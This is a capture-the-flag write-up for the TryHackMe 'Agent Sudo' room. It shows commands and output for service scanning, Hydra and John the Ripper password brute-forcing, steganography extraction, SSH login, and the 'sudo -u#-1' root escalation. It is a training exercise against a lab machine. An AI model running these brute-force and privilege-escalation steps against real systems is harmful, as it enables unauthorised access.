# Agent Sudo

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information
```
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.
```
Room link: [https://tryhackme.com/r/room/agentsudoctf](https://tryhackme.com/r/room/agentsudoctf)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ nmap -v -sV -sC 10.10.173.162
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 16:15 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Initiating Ping Scan at 16:16
Scanning 10.10.173.162 [2 ports]
Completed Ping Scan at 16:16, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:16
Completed Parallel DNS resolution of 1 host. at 16:16, 0.00s elapsed
Initiating Connect Scan at 16:16
Scanning 10.10.173.162 [1000 ports]
Discovered open port 21/tcp on 10.10.173.162
Discovered open port 22/tcp on 10.10.173.162
Discovered open port 80/tcp on 10.10.173.162
Completed Connect Scan at 16:16, 0.65s elapsed (1000 total ports)
Initiating Service scan at 16:16
Scanning 3 services on 10.10.173.162
Completed Service scan at 16:16, 6.11s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.173.162.
Initiating NSE at 16:16
Completed NSE at 16:16, 3.62s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.29s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Nmap scan report for 10.10.173.162
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Annoucement
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Initiating NSE at 16:16
Completed NSE at 16:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.11 seconds
```
We have three services running:
- vsftpd 3.0.3 on port 21
- OpenSSH 7.6p1  on port 22
- Apache httpd 2.4.29 on port 80

### Manually browse to the web site

Manually browsing to port 80 with `curl` shows the following message
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ curl http://10.10.173.162

<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```

Let's change our [User-Agent header](https://en.wikipedia.org/wiki/User-Agent_header) and try again
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ curl -A "R" -L http://10.10.173.162 
What are you doing! Are you one of the 25 employees? If not, I going to report this incident
<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
```
No luck!

We could try to bruteforce the agent user name (`A-Z`)
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ for user in {A..Z}; do echo "---$user---"; curl -A "$user" -L http://10.10.173.162 ; done
---A---

<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
---B---

<!DocType html>
<html>
<head>
        <title>Annoucement</title>
</head>

<body>
<p>
        Dear agents,
        <br><br>
        Use your own <b>codename</b> as user-agent to access the site.
        <br><br>
        From,<br>
        Agent R
</p>
</body>
</html>
---C---
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R 

---D---

<!DocType html>
<html>
<---snip--->
```
We found the agent name `chris`.

### Brute force chris's password for FTP

Next, we check for Chris's FTP password with `hydra`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.173.162 ftp             
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-18 16:37:57
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://10.10.173.162:21/
[21][ftp] host: 10.10.173.162   login: chris   password: crystal
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-18 16:38:56
```
The password is `crystal`.

Now we login with FTP and search for interesting files
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ ftp chris@10.10.173.162    
Connected to 10.10.173.162.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||9396|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
226 Directory send OK.
ftp> mget *
mget To_agentJ.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||38184|)
150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).
100% |*********************************************************************************************************************************************|   217       55.11 KiB/s    00:00 ETA
226 Transfer complete.
217 bytes received in 00:00 (4.88 KiB/s)
mget cute-alien.jpg [anpqy?]? y
229 Entering Extended Passive Mode (|||18018|)
150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).
100% |*********************************************************************************************************************************************| 33143      756.76 KiB/s    00:00 ETA
226 Transfer complete.
33143 bytes received in 00:00 (391.90 KiB/s)
mget cutie.png [anpqy?]? y
229 Entering Extended Passive Mode (|||32940|)
150 Opening BINARY mode data connection for cutie.png (34842 bytes).
100% |*********************************************************************************************************************************************| 34842      548.74 KiB/s    00:00 ETA
226 Transfer complete.
34842 bytes received in 00:00 (336.02 KiB/s)
ftp> quit
221 Goodbye.
```

We read the text file
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ cat To_agentJ.txt               
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

### Extract embedded files with binwalk

As hinted we search for embedded files in the pictures with `binwalk`
```bash          
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ binwalk -Me cute-alien.jpg 

Scan Time:     2024-09-18 16:44:59
Target File:   /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Agent_Sudo/cute-alien.jpg
MD5 Checksum:  502df001346ac293b2d2cb4eeb5c57cc
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             JPEG image data, JFIF standard 1.01


┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ binwalk -Me cutie.png

Scan Time:     2024-09-18 16:48:32
Target File:   /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Agent_Sudo/cutie.png
MD5 Checksum:  7d0590aebd5dbcfe440c185160c73c9e
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22


Scan Time:     2024-09-18 16:48:32
Target File:   /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Agent_Sudo/_cutie.png.extracted/365
MD5 Checksum:  1e7ac52e2601e6722fda312938ab2c1d
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------


Scan Time:     2024-09-18 16:48:32
Target File:   /mnt/hgfs/Wargames/TryHackMe/CTFs/Easy/Agent_Sudo/_cutie.png.extracted/To_agentR.txt
MD5 Checksum:  d41d8cd98f00b204e9800998ecf8427e
Signatures:    411

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
```

We check the results
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ cd _cutie.png.extracted 

┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
└─$ ls -la
total 311
drwxrwxrwx 1 root root      0 Sep 18 16:48 .
drwxrwxrwx 1 root root   4096 Sep 18 16:48 ..
-rwxrwxrwx 1 root root 279312 Sep 18 16:48 365
-rwxrwxrwx 1 root root  33973 Sep 18 16:48 365.zlib
-rwxrwxrwx 1 root root    280 Sep 18 16:48 8702.zip
-rwxrwxrwx 1 root root      0 Oct 29  2019 To_agentR.txt
```
A zip-file called `8702.zip`. Let's try to unzip it.
```bash
┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
└─$ unzip 8702.zip                                      
Archive:  8702.zip
   skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)
```
Nope, not new enough version. We try 7-Zip instead
```bash
┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
└─$ 7z e 8702.zip 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz (306C3),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 14:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 14:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
ERROR: Wrong password : To_agentR.txt
                    
Sub items Errors: 1

Archives with Errors: 1

Sub items Errors: 1
```
The zip-file is password protected.

### Crack the hash with JtR

First we get the hash
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ zip2john _cutie.png.extracted/8702.zip > zip_hash.txt
```
Next we try to crack it with the `rockyou` wordlist
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])
Cost 1 (HMAC size) is 78 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alien            (8702.zip/To_agentR.txt)     
1g 0:00:00:00 DONE (2024-09-18 16:58) 1.538g/s 37809p/s 37809c/s 37809C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
The password is `alien`.

Retry to open the zip-file
```bash
┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
└─$ 7z e 8702.zip                         

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs Intel(R) Core(TM) i7-4790 CPU @ 3.60GHz (306C3),ASM,AES-NI)

Scanning the drive for archives:
1 file, 280 bytes (1 KiB)

Extracting archive: 8702.zip
--
Path = 8702.zip
Type = zip
Physical Size = 280

    
Would you like to replace the existing file:
  Path:     ./To_agentR.txt
  Size:     0 bytes
  Modified: 2019-10-29 14:29:11
with the file from archive:
  Path:     To_agentR.txt
  Size:     86 bytes (1 KiB)
  Modified: 2019-10-29 14:29:11
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? Y

                    
Enter password (will not be echoed):
Everything is Ok    

Size:       86
Compressed: 280

┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
└─$ cat To_agentR.txt                     
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

The text looks Base64-encoded
```bash
┌──(kali㉿kali)-[/mnt/…/CTFs/Easy/Agent_Sudo/_cutie.png.extracted]
└─$ echo 'QXJlYTUx' | base64 -d                                                      
Area51  
```

### Extract data with steghide

Next, we can try to extract info from the other picture file (`cute-alien.jpg`)
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ steghide extract -sf cute-alien.jpg -p Area51
wrote extracted data to "message.txt".
```
Check the extracted file
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ cat message.txt  
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
We have found another user and password.

### Login with SSH as james

Now we ought to be able to login with SSH as `james`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ ssh james@10.10.173.162                               
The authenticity of host '10.10.173.162 (10.10.173.162)' can't be established.
ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.173.162' (ED25519) to the list of known hosts.
james@10.10.173.162's password: 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 18 15:16:19 UTC 2024

  System load:  0.0               Processes:           94
  Usage of /:   39.7% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.173.162
  Swap usage:   0%


75 packages can be updated.
33 updates are security updates.


Last login: Tue Oct 29 14:26:27 2019
james@agent-sudo:~$ 
```

### Get the user flag

Let's search for the user flag
```bash
james@agent-sudo:~$ ls -la
total 80
drwxr-xr-x 4 james james  4096 Oct 29  2019 .
drwxr-xr-x 3 root  root   4096 Oct 29  2019 ..
-rw-r--r-- 1 james james 42189 Jun 19  2019 Alien_autospy.jpg
-rw------- 1 root  root    566 Oct 29  2019 .bash_history
-rw-r--r-- 1 james james   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 james james  3771 Apr  4  2018 .bashrc
drwx------ 2 james james  4096 Oct 29  2019 .cache
drwx------ 3 james james  4096 Oct 29  2019 .gnupg
-rw-r--r-- 1 james james   807 Apr  4  2018 .profile
-rw-r--r-- 1 james james     0 Oct 29  2019 .sudo_as_admin_successful
-rw-r--r-- 1 james james    33 Oct 29  2019 user_flag.txt
james@agent-sudo:~$ cat user_flag.txt 
b<REDACTED>7
```

### Research the Alien autopsy picture

In the home directory there is another alien picture (`Alien_autospy.jpg`).  
Let's download it with `scp`
```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Agent_Sudo]
└─$ scp james@10.10.173.162:Alien_autospy.jpg ./Alien_autopsy.jpg          
james@10.10.173.162's password: 
Alien_autospy.jpg                                                                                                                                       100%   41KB 238.4KB/s   00:00    
```

We want to know about the incident and for that we use [TinEye](https://tineye.com/).  
One of the hits is from [Fox News](https://www.foxnews.com/science/filmmaker-reveals-how-he-faked-infamous-roswell-alien-autopsy-footage-in-a-london-apartment) and gives us the answer.

### Enumeration

We now start enumerating for ways to escalate our privileges.  
First we check if we can run any commands as root via `sudo`
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ 
```
We can run `/bin/bash` as `root`.

The CVE for this vulnerability can be found by Googling for
```
sudo local privilege escalation cve 2019
```

### Get the root flag

Finally we can get the root flag by using the vulnerability
```bash
james@agent-sudo:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b<REDACTED>2

By,
D<REDACTED>l a.k.a Agent R
```
And there we have the flag and Agent R's name.

For additional information, please see the references below.

## References

- [Apache HTTP Server - Wikipedia](https://en.wikipedia.org/wiki/Apache_HTTP_Server)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [Binwalk - Github](https://github.com/ReFirmLabs/binwalk)
- [Binwalk - Kali Tools](https://www.kali.org/tools/binwalk/)
- [curl - Linux manual page](https://man7.org/linux/man-pages/man1/curl.1.html)
- [File Transfer Protocol - Wikipedia](https://en.wikipedia.org/wiki/File_Transfer_Protocol)
- [Gobuster - Github](https://github.com/OJ/gobuster/)
- [Gobuster - Kali Tools](https://www.kali.org/tools/gobuster/)
- [Hydra - Kali Tools](https://www.kali.org/tools/hydra/)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [john - Kali Tools](https://www.kali.org/tools/john/)
- [steghide - Homepage](https://steghide.sourceforge.net/)
- [steghide - Kali Tools](https://www.kali.org/tools/steghide/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [TinEye - Reverse Image Search](https://tineye.com/)
- [sudo - Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [sudo - Wikipedia](https://en.wikipedia.org/wiki/Sudo)
- [THC-Hydra - Github](https://github.com/vanhauser-thc/thc-hydra)
- [User-Agent header - Wikipedia](https://en.wikipedia.org/wiki/User-Agent_header)
